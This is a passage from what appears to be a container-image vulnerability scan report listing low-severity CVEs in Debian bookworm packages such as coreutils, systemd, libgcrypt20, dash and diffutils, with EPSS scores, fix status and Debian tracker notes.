</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>coreutils</strong> <code>9.1-1</code> (deb)</summary>

<small><code>pkg:deb/debian/coreutils@9.1-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-56392?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--56392" src="https://img.shields.io/badge/CVE--2026--56392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.186%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU coreutils unexpand is vulnerable to a heap-based buffer overflow due to an integer overflow during buffer allocation when processing large tab stop (-t) values. The multiplication used to calculate the allocation size can wrap around, resulting in an undersized buffer. When processing crafted input, subsequent writes exceed the allocated memory, leading to an out‑of‑bounds heap write.  When running GNU coreutils unexpand with attacker-provided large tab stop (-t) arguments, this behavior leads to a crash and potentially achieve a heap write primitive depending on memory layout.           This issue has been fixed in the commit b60a159fdc5bfcf9988d3a4cb6f53abe8ad5d35d

---
- coreutils <unfixed> (unimportant)
Fixed by: https://git.savannah.gnu.org/cgit/coreutils.git/commit/?id=b60a159fdc5bfcf9988d3a4cb6f53abe8ad5d35d
https://www.openwall.com/lists/oss-security/2026/07/25/2
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-56391?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--56391" src="https://img.shields.io/badge/CVE--2026--56391-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU coreutils uniq is vulnerable to an out‑of‑bounds read due to incorrect handling of multibyte input when the -w (--check-chars) option is used. The find_field() function miscalculates the byte length of characters by repeatedly processing a fixed pointer instead of advancing through the input, resulting in an inflated length value.  This incorrect length is later used in a memcmp operation, causing reads beyond the allocated buffer when processing crafted multibyte input.  When running GNU coreutils uniq with attacker-provided arguments, this behavior leads to a crash and potential adjacent heap memory exposure.   This issue has been fixed in the commit d64e35a8a4c0e4608321433e0d84d917e4e36371.

---
- coreutils <unfixed> (unimportant)
Fixed by: https://git.savannah.gnu.org/cgit/coreutils.git/commit/?id=d64e35a8a4c0e4608321433e0d84d917e4e36371
https://www.openwall.com/lists/oss-security/2026/07/25/2
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-5278?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--5278" src="https://img.shields.io/badge/CVE--2025--5278-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.310%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GNU Coreutils. The sort utility's begfield() function is vulnerable to a heap buffer under-read. The program may access memory outside the allocated buffer if a user runs a crafted command using the traditional key format. A malicious input could lead to a crash or leak sensitive data.

---
- coreutils <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106733; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2368764
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00036.html
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00040.html
https://cgit.git.savannah.gnu.org/cgit/coreutils.git/commit/?id=8c9602e3a145e9596dc1a63c6ed67865814b6633
https://www.openwall.com/lists/oss-security/2025/05/27/2
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=78507
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-18018?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2017--18018" src="https://img.shields.io/badge/CVE--2017--18018-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.345%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX "-R -L" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.

---
- coreutils <unfixed> (unimportant)
http://lists.gnu.org/archive/html/coreutils/2017-12/msg00045.html
https://www.openwall.com/lists/oss-security/2018/01/04/3
Documentation patches proposed:
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00072.html
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00073.html
Neutralised by kernel hardening

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>systemd</strong> <code>252.39-1~deb12u2</code> (deb)</summary>

<small><code>pkg:deb/debian/systemd@252.39-1~deb12u2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-31439?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31439" src="https://img.shields.io/badge/CVE--2023--31439-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.349%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31438?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31438" src="https://img.shields.io/badge/CVE--2023--31438-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.325%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31437?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2023--31437" src="https://img.shields.io/badge/CVE--2023--31437-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.341%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2013-4392?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2013--4392" src="https://img.shields.io/badge/CVE--2013--4392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.468%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.

---
- systemd <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=725357)
[wheezy] - systemd <not-affected> (/etc/tmpfiles.d not supported in Wheezy)
https://bugzilla.redhat.com/show_bug.cgi?id=859060
only relevant to systems running systemd along with selinux

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>libgcrypt20</strong> <code>1.10.1-3+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libgcrypt20@1.10.1-3%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-2236?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2024--2236" src="https://img.shields.io/badge/CVE--2024--2236-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.140%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.

---
- libgcrypt20 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1065683)
https://bugzilla.redhat.com/show_bug.cgi?id=2268268
https://lists.gnupg.org/pipermail/gcrypt-devel/2024-March/005607.html
https://github.com/tomato42/marvin-toolkit/tree/master/example/libgcrypt
https://people.redhat.com/~hkario/marvin/
https://dev.gnupg.org/T7136
https://gitlab.com/redhat-crypto/libgcrypt/libgcrypt-mirror/-/merge_requests/17
Not in scope for libgcrypt security policy, work ongoing to add support in the protocol layer

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6829?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2018--6829" src="https://img.shields.io/badge/CVE--2018--6829-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.777%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

cipher/elgamal.c in Libgcrypt through 1.8.2, when used to encrypt messages directly, improperly encodes plaintexts, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for Libgcrypt's ElGamal implementation.

---
- libgcrypt20 <unfixed> (unimportant)
- libgcrypt11 <removed> (unimportant)
- gnupg1 <unfixed> (unimportant)
- gnupg <removed> (unimportant)
https://github.com/weikengchen/attack-on-libgcrypt-elgamal
https://github.com/weikengchen/attack-on-libgcrypt-elgamal/wiki
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004394.html
GnuPG uses ElGamal in hybrid mode only.
This is not a vulnerability in libgcrypt, but in an application using
it in an insecure manner, see also
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004401.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>dash</strong> <code>0.5.12-2</code> (deb)</summary>

<small><code>pkg:deb/debian/dash@0.5.12-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-102474?s=debian&n=dash&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--102474" src="https://img.shields.io/badge/CVE--2026--102474-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.113%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in dash. The printf builtin reserves four bytes before converting a Unicode \u or \U escape, but the multi-byte token can need five or six bytes. A local user who can supply such an escape to dash printf or echo %b, including through dash -c and a positional argument, can write one or two bytes past that reservation.

---
- dash <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2543004
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102473?s=debian&n=dash&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--102473" src="https://img.shields.io/badge/CVE--2026--102473-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.102%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in dash. When built without libc fnmatch, the internal pmatch() matcher implements * by unbounded recursion over candidate positions. A local user who can plant filenames, or otherwise feed that matcher, can make a short multi-star pattern such as *.*.*.*.*.tar.gz consume excessive CPU.

---
- dash <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1149887; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2543005
Negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>gcc-12</strong> <code>12.2.0-14+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/gcc-12@12.2.0-14%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-115456?s=debian&n=gcc-12&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--115456" src="https://img.shields.io/badge/CVE--2026--115456-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.371%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gcc. An attacker could cause a Denial of Service (DoS) by passing a string that is not null-terminated to the std::from_chars() function in the libstdc++ library. This issue triggers an out-of-bounds read beyond the allocated buffer, potentially leading to invalid data parsing or an application crash.

---
- gcc-16 <unfixed>
- gcc-15 <unfixed>
- gcc-14 <unfixed>
[trixie] - gcc-14 <no-dsa> (Minor issue)
- gcc-13 <unfixed>
[trixie] - gcc-13 <no-dsa> (Minor issue)
- gcc-12 <unfixed>
[trixie] - gcc-12 <no-dsa> (Minor issue)
- gcc-11 <unfixed>
https://bugzilla.redhat.com/show_bug.cgi?id=2563044

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-27943?s=debian&n=gcc-12&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2022--27943" src="https://img.shields.io/badge/CVE--2022--27943-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.953%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>62nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libiberty/rust-demangle.c in GNU GCC 11.2 allows stack consumption in demangle_const, as demonstrated by nm-new.

---
- gcc-12 <unfixed> (unimportant)
Negligible security impact
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=105039

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>shadow</strong> <code>1:4.13+dfsg1-1+deb12u2</code> (deb)</summary>

<small><code>pkg:deb/debian/shadow@1%3A4.13%2Bdfsg1-1%2Bdeb12u2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2007-5686?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2007--5686" src="https://img.shields.io/badge/CVE--2007--5686-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.942%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>62nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.

---
- shadow <unfixed> (unimportant)
See #290803, on Debian LOG_UNKFAIL_ENAB in login.defs is set to no so
unknown usernames are not recorded on login failures

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>apt</strong> <code>2.6.2</code> (deb)</summary>

<small><code>pkg:deb/debian/apt@2.6.2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-3374?s=debian&n=apt&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2011--3374" src="https://img.shields.io/badge/CVE--2011--3374-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.191%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.

---
- apt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=642480)
Not exploitable in Debian, since no keyring URI is defined

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>diffutils</strong> <code>1:3.8-4</code> (deb)</summary>

<small><code>pkg:deb/debian/diffutils@1%3A3.8-4?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-53910?s=debian&n=diffutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2026--53910" src="https://img.shields.io/badge/CVE--2026--53910-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.291%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

diff3 tool from GNU diffutils is vulnerable to a heap‑based buffer overflow due to multiple signed integer overflows in line‑mapping calculations. Incorrect arithmetic in mapping line ranges can result in corrupted values being used for memory allocation and loop bounds. When processing crafted diff output, these overflows may cause the application to allocate insufficient memory and subsequently perform out‑of‑bounds writes during internal processing.  An attacker who can control the output of the diff program used by diff3 (e.g. via --diff-program pointing to a malicious script) can trigger out-of-bounds writes, resulting in a crash and potentially remote code execution depending on the environment.   This issue has been fixed in commit 9ff04d5b84743e331e80b589335a52c5480d1815   NOTE: The project maintainers claim that this is not a security issue. They state that the worst outcome this issue can cause is a crash of diff and that it cannot be used to escalate privileges.

---
- diffutils <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1142675; unimportant)
Fixed by: https://cgit.git.savannah.gnu.org/cgit/diffutils.git/commit/?id=73ed7ce85cc78effb94daf028c9af6b4e5252e50
Fixed by: https://cgit.git.savannah.gnu.org/cgit/diffutils.git/commit/?id=9ff04d5b84743e331e80b589335a52c5480d1815
Negligible security impact.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>gnupg2</strong> <code>2.2.40-1.1+deb12u2</code> (deb)</summary>

<small><code>pkg:deb/debian/gnupg2@2.2.40-1.1%2Bdeb12u2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-3219?s=debian&n=gnupg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2022--3219" src="https://img.shields.io/badge/CVE--2022--3219-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.293%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.

---
- gnupg2 <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2127010
https://dev.gnupg.org/D556
https://dev.gnupg.org/T5993
https://www.openwall.com/lists/oss-security/2022/07/04/8
GnuPG upstream is not implementing this change.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>golang.org/x/sys</strong> <code>0.0.0-20220715151400-c0bba94af5f8</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/sys@0.0.0-20220715151400-c0bba94af5f8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-39824?s=golang&n=sys&ns=golang.org%2Fx&t=golang&vr=%3C0.44.0"><img alt="low : CVE--2026--39824" src="https://img.shields.io/badge/CVE--2026--39824-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><0.44.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.44.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.114%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

NewNTUnicodeString does not check for string length overflow. When provided with a string that overflows the maximum size of a NTUnicodeString (a 16-bit number of bytes), it returns a truncated string rather than an error.

</blockquote>
</details>
</details></td></tr>
</table>

